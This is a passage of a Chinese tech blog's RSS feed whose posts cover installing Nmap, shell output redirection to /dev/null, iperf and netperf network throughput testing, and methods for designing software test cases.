        <guid>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netnmap-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/</guid>
        <description>&lt;h2 id=&#34;1nmap&#34;&gt;1.Nmap&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://www.nmap.com.cn/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Nmap中文网下载  &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端&lt;/strong&gt;。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦称 fingerprinting）。它是网络管理员必用的软件之一，以及用以评估网络系统安全。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 安装依赖&lt;/span&gt;
gcc -v &lt;span style=&#34;color:#75715e&#34;&gt;#需要c语言编译 &lt;/span&gt;
yum install gcc  &lt;span style=&#34;color:#75715e&#34;&gt;#安装编译器&lt;/span&gt;
yum install gcc-c++ &lt;span style=&#34;color:#75715e&#34;&gt;# 安装需要c++&lt;/span&gt;
-----------------------------------------------------------
&lt;span style=&#34;color:#75715e&#34;&gt;#下载源码后解压，进入文件夹编译&lt;/span&gt;
tar jxvf Nmap.tar.bz2
cd Nmap.tar.bz2
./configure  
make &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; make install  &lt;span style=&#34;color:#75715e&#34;&gt;#安装&lt;/span&gt;
nmap ip  &lt;span style=&#34;color:#75715e&#34;&gt;#扫描端口&lt;/span&gt;
nmap -v  
&lt;span style=&#34;color:#75715e&#34;&gt;#如果出现nmap命令无法找到的错误&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#尝试进入nmap文件内，使用./nmap ip运行程序&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Linux—输出到空文件</title>
        <link>https://ac-lm.github.io/posts/linux/linux%E8%BE%93%E5%87%BA%E5%88%B0%E7%A9%BA%E6%96%87%E4%BB%B6/</link>
        <pubDate>Mon, 16 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linux%E8%BE%93%E5%87%BA%E5%88%B0%E7%A9%BA%E6%96%87%E4%BB%B6/</guid>
        <description>&lt;h2 id=&#34;1文件-devnull&#34;&gt;1.文件 /dev/null&lt;/h2&gt;
&lt;p&gt;代表空设备文件，垃圾箱一类的文件，类似于文件 &lt;strong&gt;/dev/zero&lt;/strong&gt;（这个文件只会输出0）&lt;/p&gt;
&lt;h2 id=&#34;2语句-1--devnull-21-的含义&#34;&gt;2.语句 1 &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 的含义&lt;/h2&gt;
&lt;p&gt;在shell中，每个进程都和三个系统文件相关联：标准输入stdin，标准输出stdout、标准错误stderr，三个系统文件的文件描述符分别为0，1，2&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;1 &amp;gt; /dev/null&lt;/strong&gt; ： 表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2&amp;gt;&amp;amp;1&lt;/strong&gt; ：表示标准错误输出重定向到（等同于）标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt; ：代表重定向到哪里，例如：echo &amp;ldquo;123&amp;rdquo; &amp;gt; /home/123.txt&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;1&lt;/strong&gt; ：表示 stdout 标准输出，系统默认值是1，所以&amp;quot;&amp;gt;/dev/null&amp;quot;等同于&amp;quot;1&amp;gt;/dev/null&amp;quot;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2&lt;/strong&gt; ：表示 stderr 标准错误&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&amp;amp;&lt;/strong&gt; ：表示等同于的意思，2&amp;gt;&amp;amp;1，表示2的输出重定向等同于1&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3实例分析&#34;&gt;3.实例分析&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;1 &amp;gt;a 2&amp;gt;a&lt;/strong&gt; ：stdout和stderr都直接送往文件 a ，a文件会被打开两遍，由此导致stdout和stderr互相覆盖，两者互相竞争使用文件 a 的管道&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;1 &amp;gt;a 2&amp;gt;&amp;amp;1&lt;/strong&gt; ：stdout直接送往文件a ，stderr是继承了stdout的管道之后，再被送往文件a 。a文件只被打开一遍，就是stdout将其打开。只使用了一个管道stdout，但已经包括了stdout和stderr。从IO效率上来讲，1 &amp;gt;a 2&amp;gt;&amp;amp;1的效率更高。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ cat test.sh
&lt;span style=&#34;color:#75715e&#34;&gt;#test.sh中包含两个命令（t, date），其中t是一个不存在的命令，执行会报错，默认情况下，错误会输出到stderr。date则能正确执行，并且输出时间信息，默认输出到stdout&lt;/span&gt;

./test.sh &amp;gt; test1.log
&lt;span style=&#34;color:#75715e&#34;&gt;#./test.sh: line 1: t: command not found&lt;/span&gt;
$ cat test1.log
&lt;span style=&#34;color:#75715e&#34;&gt;#Wed Jul 10 21:12:02 CST 2013&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#可以看到，date的执行结果被重定向到log文件中了，而t无法执行的错误则只打印在屏幕上。&lt;/span&gt;

$ ./test.sh &amp;gt; test2.log 2&amp;gt;&amp;amp;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
$ cat test2.log
&lt;span style=&#34;color:#75715e&#34;&gt;#./test.sh: line 1: t: command not found&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#Tue Oct 9 20:53:44 CST 2007&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#这次，stderr和stdout的内容都被重定向到log文件中了。&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#如果只想重定向标准错误到文件中，则可以使用2&amp;gt;file。&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其他例子：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ls 2&amp;gt;1，不会报没有2文件的错误，但会输出一个空的文件1&lt;/li&gt;
&lt;li&gt;ls xxx 2&amp;gt;1测试，没有xxx这个文件的错误输出到了1中&lt;/li&gt;
&lt;li&gt;ls xxx 2&amp;gt;&amp;amp;1测试，不会生成1这个文件了，不过错误跑到标准输出了&lt;/li&gt;
&lt;li&gt;ls xxx &amp;gt;out.txt 2&amp;gt;&amp;amp;1，实际上可换成 ls xxx 1&amp;gt;out.txt 2&amp;gt;&amp;amp;1，错误和输出都传到out.txt&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4为何21要写在后面&#34;&gt;4.为何2&amp;gt;&amp;amp;1要写在后面？&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;command &amp;gt; file 2&amp;gt;&amp;amp;1&lt;/strong&gt; ：首先是command &amp;gt; file将标准输出重定向到file中， 2&amp;gt;&amp;amp;1 是标准错误拷贝了标准输出的行为，也就是同样被重定向到file中，最终结果就是标准输出和错误都被重定向到file中。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;command 2&amp;gt;&amp;amp;1 &amp;gt;file&lt;/strong&gt;：2&amp;gt;&amp;amp;1 标准错误拷贝了标准输出的行为，但此时标准输出还是在终端。&amp;gt;file 后输出才被重定向到file，但标准错误仍然保持在终端。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Net—iperf 与 netperf 网络性能测量工具</title>
        <link>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netiperf-%E4%B8%8E-netperf-%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E6%B5%8B%E9%87%8F%E5%B7%A5%E5%85%B7/</link>
        <pubDate>Sun, 15 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netiperf-%E4%B8%8E-netperf-%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E6%B5%8B%E9%87%8F%E5%B7%A5%E5%85%B7/</guid>
        <description>&lt;h2 id=&#34;1iperf&#34;&gt;1.iperf&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://iperf.fr/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; iperf 官网下载 &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;iPerf 是一种网络性能测试工具，能对协议、定时、缓冲区等参数进行配置调整，能够测试&lt;strong&gt;TCP/UDP最大带宽、延迟抖动、数据包丢失&lt;/strong&gt;等信息。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;iPerf基于Server/Client的工作模式&lt;/strong&gt;，客户端向服务端发送一定数量的数据，服务端统计并记录带宽、延时抖动等信息。客户端将数据全部发送后，服务端会回复一个数据包给客户端，将测试数据反馈给客户端。不过，如果网络较为拥塞或者误码率较高，客户端无法收到服务端回复的数据包，则只能显示本地记录的部分测试结果，所以服务端和客户端的测试结果可能有所不同。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 安装&lt;/span&gt;
rpm -ivh xxxx.rpm
&lt;span style=&#34;color:#75715e&#34;&gt;# iPerf命令语法格式&lt;/span&gt;
iperf &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-s|-c host&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;options&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
iperf3 -s &lt;span style=&#34;color:#75715e&#34;&gt;# 服务器&lt;/span&gt;
iperf3 -c ServerIP &lt;span style=&#34;color:#75715e&#34;&gt;# 客户机&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 配置软链接&lt;/span&gt;
cd /usr/bin
ln -s iperf3 iperf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2netperf&#34;&gt;2.netperf&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://hewlettpackard.github.io/netperf/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; netperf 官网下载  &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Netperf是一种网络性能测量工具，主要用于&lt;strong&gt;测试TCP或UDP和Berkeley套接字接口的批量数据传输（bulk data transfer）和请求/应答（request/reponse）性能&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Netperf工具以Client/Server方式工作&lt;/strong&gt;，服务端是netServer，用来侦听来自客户端的连接，客户端是netperf，用来向服务发起网络测试。在客户端与服务端之间，首先建立一个控制连接，传递有关测试配置的信息，以及测试的结果。在控制连接建立并传递了测试配置信息以后，客户端与服务端之间会再建立一个测试连接，用于来回传递特殊的流量，以测试网络的性能。当netServer在服务端启动后，就可在客户端运行netperf来测试网络的性能。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;rpm -ivh xxxx.rpm
netperf -V
&lt;span style=&#34;color:#75715e&#34;&gt;# 安装完以后，会生成两个工具：netserver 和 netperf&lt;/span&gt;
netserver -D -p &lt;span style=&#34;color:#ae81ff&#34;&gt;9991&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 服务器，-D 前台运行，-p 指定端口&lt;/span&gt;
netperf -H host &lt;span style=&#34;color:#75715e&#34;&gt;# 客户端&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3网络性能指标&#34;&gt;3.网络性能指标&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;网络吞吐量&lt;/strong&gt;：单位时间内通过某个网络（信道或接口）的数据量，吞吐量受网络的带宽或者网络的额定速率限制，单位通常表示为bit/s或bps。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;网络延时&lt;/strong&gt;：一个数据包从用户的计算机发送到网站服务器，然后再立即从网站服务器返回用户计算机的来回时间。影响网络延时的主要因素是路由的跳数和网络的流量。交换机延时（Latency）是指从交换机接收到数据包到开始向目的端口复制数据包之间的时间间隔。有许多因素会影响交换机延时大小，比如转发技术等等。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;抖动&lt;/strong&gt;：用于描述包在网络中的传输延时的变化，抖动越小，说明网络质量越稳定越好。抖动是评价一个网络性能的最重要的因素。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;丢包率&lt;/strong&gt;：理想状态下是发送了多少数据包就能接收到多少数据包，但是由于信号衰减、网络质量等诸多因素的影响并不能达到理想状态，而丢包率就是指测试中所丢失的数据包数量占所发送的数据包的比率。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4-基于-iperf-测试-sdn-网络&#34;&gt;4. 基于 iPerf 测试 SDN 网络&lt;/h2&gt;
&lt;h3 id=&#34;tcp测试&#34;&gt;TCP测试&lt;/h3&gt;
&lt;p&gt;步骤1：在主机1上执行 &lt;strong&gt;iperf -s&lt;/strong&gt; 命令，以主机1为服务器端进行TCP测试。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;---------------------------------
Server listening on &lt;span style=&#34;color:#ae81ff&#34;&gt;5201&lt;/span&gt;
-----------------------------------
&lt;span style=&#34;color:#75715e&#34;&gt;# 说明：服务器端默认端口为5201&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;步骤2：在主机2上执行 &lt;strong&gt;iperf -c 主机1-IP&lt;/strong&gt; 命令，以主机2为客户端去连接主机1，测试主机1与主机2之间的吞吐量。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;iperf -c 192.168.1.243
----------------------------------------------
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;ID&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Interval         Transfer      Bandwidth
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;4&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 0.00-30.00  sec   &lt;span style=&#34;color:#ae81ff&#34;&gt;341&lt;/span&gt; MBytes     95.4 MBytes/sec
&lt;span style=&#34;color:#75715e&#34;&gt;# 结果表明主机1与主机2之间的带宽是95.4 Mbit/s&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;步骤3：&lt;strong&gt;添加参数&lt;/strong&gt;测试以下命令&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;iperf -c 主机1-IP -t &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; -i &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# -t 32 表示测试时间为32s，-i 8 表示输出频率为8s。该命令表示每8s输出一次测试结果，直到达到32s为止&lt;/span&gt;
iperf -c 主机1-IP -n 2000M -i &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# -n 2000M 表示传输的数据量为2000M，-i 5 表示输出频率为5s。该命令表示每5s输出一次测试结果，到最接近总时间为止，最后再输出总的测试结果&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;udp测试&#34;&gt;UDP测试&lt;/h3&gt;
&lt;p&gt;步骤1：在主机1上执行 &lt;strong&gt;iperf -s&lt;/strong&gt; 命令，以主机1为服务器端进行UDP测试。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;---------------------------------
Server listening on &lt;span style=&#34;color:#ae81ff&#34;&gt;5201&lt;/span&gt;
-----------------------------------
&lt;span style=&#34;color:#75715e&#34;&gt;# 说明：服务器端默认端口为5201&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;步骤2：在主机2上执行命令 &lt;strong&gt;iperf -c 主机1-IP -u&lt;/strong&gt;，以主机2为客户端去连接主机1，测试主机1与主机2之间的网络性能。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;iperf -c 192.168.1.243
----------------------------------------------
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;ID&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Interval         Transfer      Bandwidth          Jitter     Lost/Total Datagrams
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;4&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 0.00-30.00  sec   &lt;span style=&#34;color:#ae81ff&#34;&gt;341&lt;/span&gt; MBytes     95.4 MBytes/sec    0.421 ms    70050/77741 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;90%&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 结果表明主机1与主机2之间的带宽是95.4 Mbit/s&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;步骤3：&lt;strong&gt;添加参数&lt;/strong&gt;测试以下命令&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;iperf -c 主机1-IP -u -b 2000M -i &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# -b 2000M 指定客户端以2000Mbps为数据发送速率，-i 5 表示输出频率为5s&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5基于netperf测试sdn网络&#34;&gt;5.基于Netperf测试SDN网络&lt;/h2&gt;
&lt;h3 id=&#34;tcp测试-1&#34;&gt;TCP测试&lt;/h3&gt;
&lt;p&gt;步骤1：在主机1上运行服务器端，用-p指定监听端口为9991&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;netserver -D -p &lt;span style=&#34;color:#ae81ff&#34;&gt;9991&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;步骤2：在主机2上运行客户端，指定服务器端的IP地址以及端口。缺省情况下Netperf进行TCP批量传输，即-t TCP_STREAM&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;netperf -H 192.168.1.180 -p &lt;span style=&#34;color:#ae81ff&#34;&gt;9991&lt;/span&gt;
MIGRATED TCP STREAM TEST from 0.0.0.0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.0.0.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; port &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; AF_INET to 192.168.1.180 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.0.0.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; port &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; AF_INET
Recv   Send    Send                          
Socket Socket  Message  Elapsed              
Size   Size    Size     Time     Throughput  
bytes  bytes   bytes    secs.    10^6bits/sec  

 &lt;span style=&#34;color:#ae81ff&#34;&gt;87380&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;16384&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;16384&lt;/span&gt;    10.47      86.40   
&lt;span style=&#34;color:#75715e&#34;&gt;# 服务器端使用87380字节大小的socket接收缓冲，客户端使用16384字节大小的socket发送缓冲。缺省情况下，Netperf向发送的测试分组大小设置为本地系统所使用的socket发送缓冲大小，即向服务器端发送的测试分组大小也是16384字节，用时10.47s，吞吐量为86.4*10^6 bits/s。&lt;/span&gt;
&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; Byte &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; bit 
&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; KB&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt; B 
&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; MB &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt; KB 
&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; GB &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt; MB 
&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; TB &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt; GB
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;udp测试-1&#34;&gt;UDP测试&lt;/h3&gt;
&lt;p&gt;步骤3：在主机2上执行以下命令进行UDP测试&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;netperf -t UDP_STREAM -H 10.0.0.2 -p &lt;span style=&#34;color:#ae81ff&#34;&gt;9991&lt;/span&gt;
netperf -t UDP_STREAM -H 192.168.180.130 -l &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;
netperf -t UDP_STREAM -H 192.168.180.130  -- -m &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# UDP_STREAM: UDP批量传输&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# -l 指定时间 -m 设置本地系统发送测试分组的大小&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;步骤4：尝试使用以下命令&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;netperf -t TCP_RR -H 172.20.35.40 -l &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; -- -r 256,2048
&lt;span style=&#34;color:#75715e&#34;&gt;# -r 用于指定客户端和服务端每次的交互数据量，上面表示客户端每次发送256字节，服务器每次回复2048字节&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# TCP_RR 长连接 TCP_CRR 短连接 UDP_RR 长连接 &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>随记—测试用例的设计方法</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%B3%95/</link>
        <pubDate>Fri, 30 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%B3%95/</guid>
        <description>&lt;h2 id=&#34;1测试用例都是可执行的&#34;&gt;1.测试用例都是可执行的&lt;/h2&gt;
&lt;p&gt;设计用例最基本的要求是——可以执行且没有歧义。因此，用例在设计时不能包含一些似是而非的词语，比如是不是，要不要，有没有。换句话说，就是用例要么包含是，要么包含不是，比如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;装盐的袋子不能（不是）漏&lt;/li&gt;
&lt;li&gt;衣服的颜色是红的&lt;/li&gt;
&lt;li&gt;衣服的材料是80%的棉，20%的涤纶&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2用例的-3a-原则&#34;&gt;2.用例的 3A 原则&lt;/h2&gt;
&lt;p&gt;在设计用例时，应当遵循用例设计的 3A 原则，即用例中应包括以下 3 部分内容&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Arrange：初始化测试对象或者准备测试数据&lt;/li&gt;
&lt;li&gt;Act：调用被测方法&lt;/li&gt;
&lt;li&gt;Assert：断言&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3什么是测试用例&#34;&gt;3.什么是测试用例&lt;/h2&gt;
&lt;p&gt;测试用例就是测试工程师为软件程序设计一种情况，要求软件程序在这种情况下，必须能够正常运行，并且达到程序所设计的预期结果&lt;/p&gt;
&lt;h2 id=&#34;4用例的设计方法&#34;&gt;4.用例的设计方法&lt;/h2&gt;
&lt;h3 id=&#34;a等价类设计法&#34;&gt;a.等价类设计法&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;解释&lt;/strong&gt;：依据需求将输入划分为若干个等价类，从等价类中选出一个测试用例，如果这个测试用例测试通过，则认为所代表的整个等价类测试通过，这样就可以通过较少的测试用例达到尽量多的功能覆盖，解决了不能穷举测试的问题&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;弊端&lt;/strong&gt;：等价类只考虑输入域的分类，没有考虑输入域的组合，需要其他的设计方法和补充&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;有效等价类：对于程序的规格说明书是合理的，有意义的输入数据构成的集合，利用有效等价类验证程序是否实现了规格说明书中所规定的功能和性能&lt;/li&gt;
&lt;li&gt;无效等价类：根据需求说明书，不满足需求的集合&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;ex: 超市买水果&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;有效等价类：苹果，香蕉，桃子&lt;/li&gt;
&lt;li&gt;无效等价类：青菜，大米，饮料&lt;/li&gt;
&lt;/ul&gt;
